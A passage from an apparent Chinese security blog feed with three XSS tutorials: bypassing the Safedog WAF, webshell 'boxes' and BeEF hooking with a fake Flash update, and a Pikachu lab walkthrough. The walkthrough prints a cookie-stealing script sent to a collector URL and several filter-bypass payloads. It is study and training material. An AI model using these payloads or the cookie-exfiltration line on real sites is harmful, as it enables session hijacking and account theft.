    <url>/2022/10/11/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS跨站——WAF绕过及修复"><a href="#XSS跨站——WAF绕过及修复" class="headerlink" title="XSS跨站——WAF绕过及修复"></a>XSS跨站——WAF绕过及修复</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;XSS跨站漏洞的常规WAF绕过思路和其他漏洞基本上是差不多的，比如标签语法替换、特殊符号干扰、提交方式更改、垃圾数据溢出、加密解密算法以及结合其他漏洞类型绕过等等，我们依旧是以安全狗为例子</p><p>&emsp;</p><h4 id="1-绕过方法——标签语法替换"><a href="#1-绕过方法——标签语法替换" class="headerlink" title="1.绕过方法——标签语法替换"></a>1.绕过方法——标签语法替换</h4><p>&emsp;&emsp;我们可以用到不同函数进行语法的替换，比如使用herf函数来请求地址</p><p>，只是herf需要构造出一个合理的闭合语句，如下图</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/7.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;将多余的-号去掉，会显示被拦截，按我们就加入一些#等干扰符的代入</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;从防护的角度出发，由于攻击网站是无法预知的，所以一般检测是在于&lt;&gt;符号、herf函数等，我们可以尝试通过在前面加入/进行绕过，因为JavaScript的语句闭合特性。一般通过Fuzz进行查找能够通过的标签。</p><p>&emsp;</p><h4 id="2-绕过方法——特殊符号干扰"><a href="#2-绕过方法——特殊符号干扰" class="headerlink" title="2.绕过方法——特殊符号干扰"></a>2.绕过方法——特殊符号干扰</h4><p>&emsp;&emsp;首先输入跨站脚本的简单语句，通过修改判断检测的关键字符</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/1.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到，我们的输入被WAF安全狗拦截，当我们输入&lt;script时却能够通过，这时候可以判断他的字符审核机制是检测&lt;&gt;的闭合，有的还拦截部分语句的关键词如onlink等，接下来就要做拆分工作，通过一点点的减少语句的内容，判断检测情况</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到，在减少的过程中，最后访问了相关的地址，但是地址后面出现了&lt;h2，这是因为页面代码有这些修饰语句，如果我们没有&gt;的闭合，就会导致表达语句的变化，但加上又会存在&lt;&gt;闭合的检测问题，所以这样子做没有太大的意义，</p><p>&emsp;&emsp;那就需要思考我们能不能以&lt;&gt;为起点做文章呢，显然是可以的，我们可以尝试加入单引号后再去掉&gt;，最后进行数据上传</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到传送成功，最终访问了指定的地址，这是因为单引号将地址囊括起来，不会受到后面语句的影响。除了使用单括号以外我们也可以加入#或者是/后输入垃圾数据后再加#号进行规避</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/5.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;首先明确特殊符号根据语言和场景的脚本类型不同并不是固定的，#是只一种常见特殊符号，很多语言都通用，这些符号能够起到一些截断或者注释的作用。</p><p>&emsp;</p><h4 id="3-绕过方法——提交方式修改"><a href="#3-绕过方法——提交方式修改" class="headerlink" title="3.绕过方法——提交方式修改"></a>3.绕过方法——提交方式修改</h4><p>&emsp;&emsp;首先假设提交方式是以request作为提交方式</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/10.png" style="zoom:80%;" /></center><p>&emsp;&emsp;我们尝试提交简单脚本</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/11.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/12.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到一开始的提交是被拦截了的，但是当我们把提交方式变为post之后就能够成功执行简单脚本了。这是因为我们更换了提交方式，安全狗的WAF的检测有时候只是勾选了部分的提交方式。当我们使用不在名单之内的提交方式时，我们便能绕过拦截达到攻击目的</p><p>&emsp;</p><h4 id="4-绕过方法——使用工具"><a href="#4-绕过方法——使用工具" class="headerlink" title="4.绕过方法——使用工具"></a>4.绕过方法——使用工具</h4><p>&emsp;&emsp;有需求自然是有供应，为了实现自动化，有部分大佬写出了绕过工具，比如</p><ul><li>XWAF</li></ul><p>&emsp;&emsp;XWAF是一个python3写的WAF自动绕过，上一个版本是bypass_waf，XWAF相比bypass_waf更智能，可无人干预，可自动暴破绕过WAF</p><p>&emsp;&emsp;&emsp;&emsp;<a href="https://www.uedbox.com/post/55926/">https://www.uedbox.com/post/55926/</a></p><p>&emsp;&emsp;&emsp;&emsp;<a href="https://www.x-waf.com/">https://www.x-waf.com/</a></p><p>&emsp;&emsp;有条件的话可以尝试使用一下吧，至于能不能绕过新版本的WAF，我们保持一定的还与</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/13.png" style="zoom:80%;" /></center><ul><li>XSStrike</li></ul><p>&emsp;&emsp;XSStrike是一种用于测试Web应用程序的漏洞扫描器。它专门针对跨站脚本（XSS）漏洞进行测试，旨在发现可能允许攻击者执行恶意代码或在Web应用程序中执行其他攻击的漏洞。</p><p>&emsp;&emsp;XSStrike使用各种技术来识别可能的XSS漏洞，包括注入恶意JavaScript代码、在输入字段中注入HTML标记和尝试通过构造特定的URL或表单参数来触发漏洞。</p><p>&emsp;&emsp;&emsp;&emsp;<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/14.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp;WAF显示offline是因为安全狗基本只在国内使用，所以检测困难，二下面的测试语句中，passed代表语句通过也就是能够注入，filtered表示有触发到过滤器，会被拦截。</p><p>&emsp;</p><h4 id="5-绕过方法——使用Fuzz"><a href="#5-绕过方法——使用Fuzz" class="headerlink" title="5.绕过方法——使用Fuzz"></a>5.绕过方法——使用Fuzz</h4><p>&emsp;&emsp;之前有介绍过一个许多方面有关fuzz的github网址，这里就不加以描述更多，fuzz的使用基本是注入点的变化，其他的没有太大的差别，当我们需要使用到自己构造的fuzz字典时，按部就班即可</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/16.png" style="zoom:80%;" /></center><p>&emsp;&emsp;需要注意，有时候攻击失败并不是语句的问题，也有可能是Waf开启了CC流量攻击防护检测，所以如果开了CC流量攻击防护 的话，我们可以搭建一个基本相似的环境进行检测或者使用代理</p><p>&emsp;&emsp;</p><h4 id="6-XSS跨站的安全修复方案"><a href="#6-XSS跨站的安全修复方案" class="headerlink" title="6.XSS跨站的安全修复方案"></a>6.XSS跨站的安全修复方案</h4><ul><li><p>开启httponly</p></li><li><p>输入过滤</p></li><li><p>输出过滤</p></li></ul><p>&emsp;&emsp;由于语言的多样性，不管是之前的php还是现在的java语言编写，我们可以参考一些师傅提供的过滤思路：</p><p>&emsp;&emsp;&emsp;&emsp;<a href="https://blog.51cto.com/yunbk/3396436">https://blog.51cto.com/yunbk/3396436</a></p><p>&emsp;&emsp;&emsp;&emsp;<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS跨站——Webshell箱子反杀</title>
    <link href="/2022/10/09/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/"/>
    <url>/2022/10/09/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS跨站——Webshell箱子反杀"><a href="#XSS跨站——Webshell箱子反杀" class="headerlink" title="XSS跨站——Webshell箱子反杀"></a>XSS跨站——Webshell箱子反杀</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;首先了解一下什么是Webshell ，Webshell 是一种利用 web 应用程序漏洞或弱点来上传并执行恶意脚本的黑客工具。它可以让攻击者在受攻击的 web 服务器上执行任意代码，控制服务器并窃取敏感数据。Webshell 可以通过各种方式上传到 web 服务器上，包括利用漏洞、社会工程学攻击和弱口令等。攻击者可以使用 webshell 进行多种活动，例如查找和下载文件、修改文件、执行系统命令和建立反向 shell 连接</p><p>&emsp;</p><h4 id="1-Webshell箱子"><a href="#1-Webshell箱子" class="headerlink" title="1.Webshell箱子"></a>1.Webshell箱子</h4><p>&emsp;&emsp;Webshell箱子是指一个包含多个Webshell的集合或者存储库，当我们入侵也网站之后，当我们使用后门进行控制时，网站的信息、后门地址和后门密码统统会发送带一个地方，这个地方就称之为箱子</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以在相关环境配置中设置，搞一个后门作为联系，通过后门去控制网站</p><ul><li><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></li></ul><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/2.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-模拟后门场景"><a href="#2-模拟后门场景" class="headerlink" title="2.模拟后门场景"></a>2.模拟后门场景</h4><p>&emsp;&emsp;通过模拟后门传送信息到Webshell箱子中，首先在后门管理中写入一些后门代码，然后也可以进行加密处理防止被轻易的发现后门脚本</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/3.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/4.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;访问webshell查看反馈，</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/6.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;如果我们将后门发到社区，别人使用后门入侵别的网站时，我们就收到入侵的网站信息。所以当我们一般在网上查到的免费提供新的工具，可能是带后门的，也就是我们操作的时候其实也是有可能传给了提供者</p><p>&emsp;</p><h4 id="3-判定后门"><a href="#3-判定后门" class="headerlink" title="3.判定后门"></a>3.判定后门</h4><ul><li><h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5></li></ul><p>&emsp;&emsp;如何判断一个脚本有没有后门呢，搭建访问脚本查看数据包的情况就好，查看是否有给莫名其妙的地址发送后门信息；如果是程序的话，就直接使用抓包软件对程序进行抓包，或者抓当前网络接口数据包。</p><p>&emsp;&emsp;以网上下载的一个php脚本为例子</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/8.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/9.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/10.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到脚本执行的数据包是比较干净的，没有看到有向外发送数据，所以这个脚本应该是没有后门的，但是完全确定，因为也有可能通过其他协议进行传输，所以一般来说抓数据网络接口会比较准确</p><p>&emsp;&emsp;有后门的数据包情况，以前流行的ASP-木马是存在后门的，接下来进行演示：</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/12.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/13.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见有后门的传输信息，这个圈出来的地址是收信的服务端，其实菜刀也是有后门的传输</p><p>&emsp;</p><h4 id="4-BeEF工具"><a href="#4-BeEF工具" class="headerlink" title="4.BeEF工具"></a>4.BeEF工具</h4><p>&emsp;&emsp;这里使用kali虚拟机，首先打开虚拟，切换到root模式，使用ficonfig语句进行ip地址，然后输入beef-xss</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">su root</span><br><span class="hljs-attribute">ifconfig</span><br><span class="hljs-attribute">beef-xss</span><br></code></pre></td></tr></table></figure><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/14.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp;登录的账号密码就是beef，然后接下来使用beef进行xss攻击，首先复制选中的代码，框中的内容中127.0.0.1是内网ip地址，需要改成控制端的ip地址（ifconfig查的那个）</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/16.png" style="zoom:80%;" /></center><p>&emsp;&emsp;首先写入后门脚本，发送到网页当中，然后查看beef更新情况</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/17.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/18.png" style="zoom:80%;" /></center><p>&emsp;&emsp;online代表现在还在控制状态的，offline表示失去控制的，然后触发后门代码</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/19.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/20.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/21.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到我们获取了相关的控制权限，我们就能够改动相关的内容，比如flash的更新</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/22.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/23.png" style="zoom:80%;" /></center>&emsp;&emsp;<p>&emsp;&emsp;我们可以伪造成更新，然后对方会以为是更新结果点入了我们设置的后门地址，下载我们相关的木马，木马可以是电脑端木马，直接控制到电脑的权限，另外可以进行内网和ip地址的扫描，结合其他的漏洞</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/24.png" style="zoom:80%;" /></center>&emsp;&emsp;<p>&emsp;</p><h4 id="5-session问题"><a href="#5-session问题" class="headerlink" title="5.session问题"></a>5.session问题</h4><p>&emsp;&emsp;XSS跨站漏洞种类很多，归根结底是主动和自动的问题，是自己自动触发还是等管理员触发， 后者其实是比较不可取的，因为是存在了赌的成分。所以漏洞主要还是主要是在留言板、评论区、订单系统以及反馈条件等等</p><p>&emsp;&emsp;这里需要注意的是，在验证过程中有两种凭据可以判断身份信息，第一种就是我们之前想要截取的cookie，它存储在本地，存活时间较长，是比较小中类型的凭据，还有一种是session会话，存储在服务器中，存活时间较短，如果使用session进行验证的时候，我们是无法获取到cookie的</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/25.png" style="zoom:80%;" /></center>&emsp;&emsp;<p>&emsp;&emsp;当我们遇到了session验证的时候又应该如何呢，这种情况下我们的思路是通过跨站脚本访问phpinfo的文件，查找cookie相关字符，读取出phpsessid值</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/26.png" style="zoom:80%;" /></center><p>&emsp;&emsp;当然使用XSS攻击平台也是可以的</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/27.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94shell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80/28.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS跨站——攻击常见环境模拟</title>
    <link href="/2022/10/07/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/10/07/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS跨站——攻击常见环境模拟"><a href="#XSS跨站——攻击常见环境模拟" class="headerlink" title="XSS跨站——攻击常见环境模拟"></a>XSS跨站——攻击常见环境模拟</h1><h4 id="1-XSS之盲打"><a href="#1-XSS之盲打" class="headerlink" title="1.XSS之盲打"></a>1.XSS之盲打</h4><p>&emsp;&emsp;打开查看界面，可以看到有两个输入点，一个是看法，一个是名字，不难猜出，这是与数据库连接的内容，尝试输入内容查看反映</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见回显只有一个谢谢参与，明显画大饼，不行，我们一定要攻击他，所谓的盲打就是无法直接在前端看到代码的反馈效果，盲打类型交互的数据一般是被存在数据库中，也就是上一篇提到的存储型XSS，一般有留言板，调查问卷，评论等内容信息的页面。</p><p>&emsp;&emsp;这里不得不提一句，我一开始想着用测试代码试试，一直没反应，就多搞了几次，登入后面管理员查看的时候，直接崩了，我都不知道为啥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;变向的证明了，如果如果没有过滤的话，恶心管理员是有一手的。当然，这并不是重点，我们的重点是传入代码获取到管理员的cookie值从而得到权限</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt; <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;http://127.0.0.1/PIKA/pkxss/xcookie/cookie.php?cookie=&#x27;</span>  +  <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>; &lt;/script&gt;<br><br><span class="hljs-comment">//我理解这段代码的意思是将管理员网页的cookie反馈到http://127.0.0.1/PIKA/pkxss/xcookie/cookie.php?的网址中，当我拿到你的cookie之后就能为所欲为了，嘿嘿（发出了反派的笑声）</span><br></code></pre></td></tr></table></figure><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/3.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到在输入获取cookie的恶意代码后，当管理员登录后会直接执行该语句，向攻击者的工具传送cookie信息 ，管理员无法直接看到的，只有登录数据库看相关内容才能看见传送的语句</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;很好我们获取了cookie的内容，有了用户名和密码，但是密码经过了加密处理，这就使用kali的hash解密尝试一下咯，看看是什么加密方式</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">pw<span class="hljs-operator">=</span><span class="hljs-number">10470</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>b<span class="hljs-number">4</span>b<span class="hljs-number">1</span>fed<span class="hljs-number">12</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>baac<span class="hljs-number">014</span>be<span class="hljs-number">15</span>fac<span class="hljs-number">67</span><span class="hljs-keyword">c</span><span class="hljs-number">6e815</span><br></code></pre></td></tr></table></figure><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/6.png" style="zoom:80%;" /></center>&emsp;&emsp;猜测出了哈希加密的方案种类，接下来就有两种方法，比较简单的hash加密可以遍历加密结果获得明文，另一种是直接是利用工具进行连接而不进行破解密码，比如使用Postman软件，直接导入cookie值，直接进<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="2-XSS之过滤"><a href="#2-XSS之过滤" class="headerlink" title="2.XSS之过滤"></a>2.XSS之过滤</h4><p>&emsp;&emsp;&emsp;这次是XSS过滤的绕过，有了之前sql注入的相关经验，可以明白，我们的绕过方法无非就是大小写变化、拼凑语句以及使用注释进行干扰等</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/8.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到常规的xss脚本无法执行，猜测可能是使用了相关的过滤，尝试前几个说的方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">//大小写</span><br>&lt;<span class="hljs-regexp">/a&gt;&lt;SCRIPT&gt;alert(&#x27;xss&#x27;)&lt;/</span>sCRIpt&gt;&lt;a&gt;<br><span class="hljs-comment">//拼凑语句</span><br>&lt;scri&lt;script&gt;pt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;<span class="hljs-regexp">/scri&lt;/</span>script&gt;pt&gt;<br>&lt;<span class="hljs-variable constant_">SCR</span>&lt;<span class="hljs-variable constant_">SCRIPT</span>&gt;<span class="hljs-variable constant_">IPT</span>&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;<span class="hljs-regexp">/SC&lt;/</span>sCRIpt&gt;<span class="hljs-variable constant_">RIPT</span>&gt;<br><span class="hljs-comment">//注释进行干扰</span><br>&lt;scri&lt;!--liaoyue--&gt;pt&gt; <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>) &lt;/sc &lt;!--liaoyue--&gt; ript&gt;<br></code></pre></td></tr></table></figure> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/10.png" style="zoom:80%;" /></center><p>&emsp;&emsp;当我们大小写混淆拼写代码后，成功的绕过了后台的检测机制，达到了alert的目的，</p><p>&emsp;</p><h4 id="3-XSS之htmlspecialchars"><a href="#3-XSS之htmlspecialchars" class="headerlink" title="3.XSS之htmlspecialchars"></a>3.XSS之htmlspecialchars</h4><p>&emsp;&emsp;首先了解htmlspecialchars，它是函数的一种，作用是将预定义的字符转换为HTML实体，预定义的字符为：</p><ul><li>&amp;（和号)</li><li>”(双引号）</li><li>‘（单引号）</li><li>＜(小于号)</li><li>＞（大于号）</li></ul> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/13.png" style="zoom:80%;" /></center><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&amp;<span class="hljs-tag">&lt;&gt;</span><br></code></pre></td></tr></table></figure><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/14.png" style="zoom:80%;" 